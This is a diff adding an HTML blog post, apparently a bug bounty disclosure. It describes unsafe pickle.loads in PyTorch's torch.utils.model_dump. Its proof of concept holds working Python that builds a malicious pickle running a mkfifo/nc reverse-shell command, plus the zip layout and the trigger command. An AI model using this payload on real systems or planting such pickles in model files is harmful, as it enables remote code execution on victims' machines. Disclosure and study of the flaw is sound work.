@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Name" />
+<meta property="og:description" content="Name" />
+<link rel="canonical" href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-06-24T10:31:06+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-06-24T10:31:06+08:00","datePublished":"2024-06-24T10:31:06+08:00","description":"Name","headline":"Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html"},"url":"http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-06-24T10:31:06+08:00" itemprop="datePublished">Jun 24, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Command injection via unsafe pickle.loads in torch.utils.model_dump</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-94: Code Injection</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>2.3.1</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>In pytorch module <a href="https://github.com/pytorch/pytorch/blob/main/torch/utils/model_dump/__init__.py"><code class="language-plaintext highlighter-rouge">torch.utils.model_dump</code></a>, the method <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L189"><code class="language-plaintext highlighter-rouge">get_model_info</code></a> is responsible for extracting a model data in zip file. However, during the extraction, if a pickle file endswith <code class="language-plaintext highlighter-rouge">debug_pkl</code>, this file will be parsed by <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264"><code class="language-plaintext highlighter-rouge">pickle.loads</code> function</a>. In this case, if a <a href="https://book.hacktricks.xyz/pentesting-web/deserialization#pickle">malicous pickle file is parsed</a>, we can achive command injection in victim’s mechine.</p>
+
+<p>The vulnerable function: <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264"><code class="language-plaintext highlighter-rouge">get_model_info</code></a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def get_model_info(
+        path_or_file,
+        title=None,
+        extra_file_size_limit=DEFAULT_EXTRA_FILE_SIZE_LIMIT):
+    """Get JSON-friendly information about a model.
+
+    The result is suitable for being saved as model_info.json,
+    or passed to burn_in_info.
+    """
+    ...
+    with zipfile.ZipFile(path_or_file) as zf:
+        
+        code_files = {}
+        for zi in zf.infolist():
+            if not zi.filename.endswith(".py"):
+                continue
+            with zf.open(zi) as handle:
+                raw_code = handle.read()
+            with zf.open(zi.filename + ".debug_pkl") as handle:
+                raw_debug = handle.read()
+
+            # Parse debug info and add begin/end markers if not present
+            # to ensure that we cover the entire source code.
+            # vulnerable sink!!!!!!!!!!
+            debug_info_t = pickle.loads(raw_debug)
+            
+    ...
+    return {"model": dict(
+        title=title,
+        file_size=file_size,
+        version=version,
+        zip_files=zip_files,
+        interned_strings=list(interned_strings),
+        code_files=code_files,
+        model_data=model_data,
+        constants=constants,
+        extra_files_jsons=extra_files_jsons,
+        extra_pickles=extra_pickles,
+    )}
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>Firstly, let’s create a malicous model, and compress it with zip format. In <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L230"><code class="language-plaintext highlighter-rouge">get_model_info#L230</code></a>, we know the model directory must contain <code class="language-plaintext highlighter-rouge">version</code> file. In <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L238"><code class="language-plaintext highlighter-rouge">get_model_info#L238</code></a>, we know the model directory must contain <code class="language-plaintext highlighter-rouge">data.pkl</code> and <code class="language-plaintext highlighter-rouge">constants.pkl</code> files. In line <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L255"><code class="language-plaintext highlighter-rouge">get_model_info#L255</code></a> and line <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L259"><code class="language-plaintext highlighter-rouge">get_model_info#L259</code></a>, we know that the model must contain a python file and a <code class="language-plaintext highlighter-rouge">debug_pkl</code> file. So, let’s create those files:</p>
+
+<h3 id="version-1"><code class="language-plaintext highlighter-rouge">version</code></h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.1.0
+</code></pre></div></div>
+
+<h3 id="datapkl-and-constantspkl"><code class="language-plaintext highlighter-rouge">data.pkl</code> and <code class="language-plaintext highlighter-rouge">constants.pkl</code></h3>
+
+<p>Use following snippets to create <code class="language-plaintext highlighter-rouge">data.pkl</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
+student_names = [1]
+with open('data.pkl', 'wb') as f:
+    pickle.dump(student_names, f)
+</code></pre></div></div>
+
+<p>Use following snippets to create <code class="language-plaintext highlighter-rouge">constants.pkl</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
+student_names = ["df"]
+with open('constants.pkl', 'wb') as f:
+    pickle.dump(student_names, f)
+</code></pre></div></div>
+
+<h3 id="payloadpy"><code class="language-plaintext highlighter-rouge">payload.py</code></h3>
+
+<p>Just create a empty file named <code class="language-plaintext highlighter-rouge">payload.py</code></p>
+
+<h3 id="payloadpydebug_pkl"><code class="language-plaintext highlighter-rouge">payload.py.debug_pkl</code></h3>
+
+<p>Use following snippets to create a malicous pickle payload:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
+import os
+
+class RCE:
+    def __reduce__(self):
+        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
+               '/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f')
+        return os.system, (cmd,)
+
+with open('payload.py.debug_pkl', 'wb') as f:
+    pickle.dump(RCE(), f)
+</code></pre></div></div>
+
+<h3 id="malicious-model-zip-file"><code class="language-plaintext highlighter-rouge">malicious model zip file</code></h3>
+
+<p>Copy all the files to a folder and create a model zipfile:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la torch-model-dump
+-rw-r--r-- 1 kali kali   20 Jun 24 17:45 constants.pkl
+-rw-r--r-- 1 kali kali   17 Jun 24 17:45 data.pkl
+-rw-r--r-- 1 kali kali    0 Jun 24 17:45 payload.py
+-rw-r--r-- 1 kali kali  121 Jun 24 17:45 payload.py.debug_pkl
+-rw-r--r-- 1 kali kali    6 Jun 24 17:39 version
+
+&gt; zip -r torch-model-dump.zip torch-model-dump
+</code></pre></div></div>
+
+<p>The <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/torch-model-dump.zip"><code class="language-plaintext highlighter-rouge">torch-model-dump.zip</code></a> can be download from github.</p>
+
+<h2 id="start-attack">Start attack</h2>
+
+<p>Install latest pytorch:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install torch
+</code></pre></div></div>
+
+<p>Use following command to trigger the unsafe <code class="language-plaintext highlighter-rouge">pickle.loads</code> command injection:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m torch.utils.model_dump --style=json ./torch-model-dump.zip
+</code></pre></div></div>
+
+<p>After the command executed, we can check the <code class="language-plaintext highlighter-rouge">/tmp/f</code> file is created.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /tmp/f
+prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
+</code></pre></div></div>
+<h2 id="colab">Colab</h2>
+
+<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1jKXmbFS4EcpwfYn1UXeKPFNV-dB3VtIs?usp=sharing">https://colab.research.google.com/drive/1jKXmbFS4EcpwfYn1UXeKPFNV-dB3VtIs?usp=sharing</a></p>
+
+<p><img src="/assets/images/bughunter/torch-pickle.png" alt="image" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. If victims parse a malicious model file using <code class="language-plaintext highlighter-rouge">torch.utils.model_dump</code>, command injection can be achieved.</p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264">get_model_info#L264</a></p>
+
+
+  </div><a class="u-url" href="/command-injection/2024/06/24/command-injection-in-pytorch.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
